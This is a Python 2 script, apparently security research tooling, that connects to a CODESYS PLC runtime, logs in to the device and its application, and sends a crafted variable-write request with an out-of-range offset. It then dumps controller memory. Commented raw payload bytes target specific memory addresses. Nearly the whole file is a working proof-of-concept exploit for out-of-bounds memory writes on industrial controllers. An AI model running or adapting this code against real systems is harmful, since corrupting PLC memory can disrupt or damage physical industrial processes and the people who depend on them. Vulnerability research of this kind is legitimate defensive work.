#! /usr/bin/env python2
import struct
import sys
import time

sys.path.append("..")
from lib import pycodesys
from lib.layers import layer7, parse_tags_to_dict, s_tag
from lib.utils import pretty_format_tagsdict
from lib.pycodesys import CodesysNode, VMeta, CDS_WORD, CDS_INT, CDS_SIZE, CDS_TYPE_IDS

'''
Mon2 0x0 Write 0x0

'''

'''
memtools write to 0xF77035F8 or near:
"\x01\x94\x80\x00\xa5\x41\x18\x78\x2c\xa9\xe6\x79\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x03\xc8\x80\x00\x00\x00\x01\x00" \
"\x00\x00\xff\x1b\x00\x15\x0c\x00\x02\xdc\x0a\x06\x03\x17\x0c\x09" \
"\x04\x1b\x06\x00\x01\x00\x00\x17\x04\x09\x04\x17\x08\x09\x04\x04" \
"\x00\x00\x01\x00\x00\x00\xff\x1b\x00\x15\x0c\x00\x02\xdd\x0a\x06" \
"\x03\x17\x0c\x09\x04\x1b\x06\x00\x01\x00\x00\x17\x04\x09\x04\x17" \
"\x08\x09\x04\x04"

"\x01\x94\x80\x00\xa5\x41\x18\x78\x2c\xa9\xe6\x79\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x03\xc8\x80\x00\x00\x00\x01\x00" \
"\x00\x00\xff\x1b\x00\x15\x0c\x00\x02\xde\x0a\x06\x03\x17\x0c\x09" \
"\x04\x1b\x06\x00\x01\x00\x00\x17\x04\x09\x04\x17\x08\x09\x04\x04" \
"\x00\x00\x01\x00\x00\x00\xff\x1b\x00\x15\x0c\x00\x02\xdf\x0a\x06" \
"\x03\x17\x0c\x09\x04\x1b\x06\x00\x01\x00\x00\x17\x04\x09\x04\x17" \
"\x08\x09\x04\x04"

"\x01\x94\x80\x00\xa5\x41\x18\x78\x2c\xa9\xe6\x79\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x03\xc8\x80\x00\x00\x00\x01\x00" \
"\x00\x00\xff\x1b\x00\x15\x0c\x00\x02\xe0\x0a\x06\x03\x17\x0c\x09" \
"\x04\x1b\x06\x00\x01\x00\x00\x17\x04\x09\x04\x17\x08\x09\x04\x04" \
"\x00\x00\x01\x00\x00\x00\xff\x1b\x00\x15\x0c\x00\x02\xe1\x0a\x06" \
"\x03\x17\x0c\x09\x04\x1b\x06\x00\x01\x00\x00\x17\x04\x09\x04\x17" \
"\x08\x09\x04\x04"

    
    
'''

cds = pycodesys.CodesysNode(host=sys.argv[1], port=11740, verbose=False)
chan_id = cds.connect()

# Login to Device
cds.loginToDevice()

# List loaded applications
appname = cds.readAppList()
print(appname)

#  Login to App
cds.loginToApp(appname)

cds.reset()



# From log
# area=0, size=1048576, type=0xfe9f, addr=0x0xf78d9000
# area=3, size=1048576, type=0x0040, addr=0x0xf77d9000

A_SIZE=0x100000 # dec 1048576

A3_ADDR=0xf77d9000
A3_END = 0xF78D9000

A0_ADDR=0xf78d9000
A0_END=0xF79D9000



# Build L7 payload

if cds.verbose:
    print('[c] Writing variables')

if not cds.app_sess_id:
    print('Login to App first')
    exit('Login to App first')

if not cds.app_sess_id2:
    print('Login to App first')
    exit('Login to App first')

# BABA str
# var_offset = 0x35f8
# var_type = 0x10
# var_size = 4

for i in range(0,1):

    time.sleep(0.2)
    # Auth tokens
    tag_1 = s_tag(0x1, struct.pack("<I", cds.app_sess_id) + struct.pack("<I",
                                                                         cds.app_sess_id2) + "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
    t3_multiple = ''

    var_offset = 0xFFFF
    var_size = 64
    var_size_actual = 64

    byte_of_choice = "\xEE"
    write_value =  byte_of_choice * var_size_actual


    bcode = "\x02" + struct.pack('<H', var_offset) + "\x06\x00"

    # Magic sequences (IDE x32 3.5 SP16, Runtime: sutd 32):
    # unknown_1 = "\x1b\x00\x15\x0c"
    # unknown_2 = "\x17\x0c\x09\x04" + "\x1b\x06\x00\x01"
    # unknown_3 = "\x17\x04\x09\x04" + "\x17\x08\x09\x04" + "\x04\x00"

    # #Magic sequences (IDE 3.5 SP17 Patch 1 x64, Runtime: Linux SL 64 4.0.0.0 Target 4102):
    # unknown_1 = "\x1b\x00\x15\x10"
    # unknown_2 = "\x17\x10\x09\x04" + "\x1b\x06\x00\x01"
    # unknown_3 = "\x17\x08\x09\x08" + "\x17\x0c\x09\x04" + "\x04\x00"

    # Magic sequences 3
    unknown_1 = "\x1b\x00\x15\x0c"
    unknown_2 = "\x17\x0c\x09\x04" + "\x1b\x06\x00\x01"
    unknown_3 = "\x17\x04\x09\x04" + "\x17\x08\x09\x04" + "\x04\x00"


    tag_3 = s_tag(0x3, "\x00\x00" + struct.pack("<H",
                                                var_size) + "\x00\x00" + write_value + unknown_1 + "\x00" + bcode + unknown_2 + "\x00\x00" + unknown_3 + "\x00\x00")

    t3_multiple += tag_3

    # L7 payload (Auth and varlist)
    tagdata = tag_1 + t3_multiple


    # Send L7 payload

    cds.send_layer7(layer7(service_group=0x1b, command_id=0x2, sess_id=cds.sess_id, data=tagdata))

    # Response
    res = cds.recv_layer7()

    #  0x41 is error
    if 0x41 in res:
        err_code = struct.unpack("<I", res[0x41])[0]
        if err_code == 0x05:
            print('[-] Error when writing variables: Invalid pointer')
        elif err_code == 0x08:
            print('[-] Error when writing variables: Buffer size exceeded')
        elif err_code == 0x0C:
            print('[-] Error when writing variables: Mon exception')
        else:
            print('[-] Error when writing variables: ' + hex(err_code))


    elif res == {}:
            print('[*] Variables written')
            # Read mem area0
            cds.memdump(0xf78d9000 + var_offset)

    else:
            cds.disconnect()
            print('[-] Error when writing variables: response should be empty ' + str(res))



cds.disconnect()









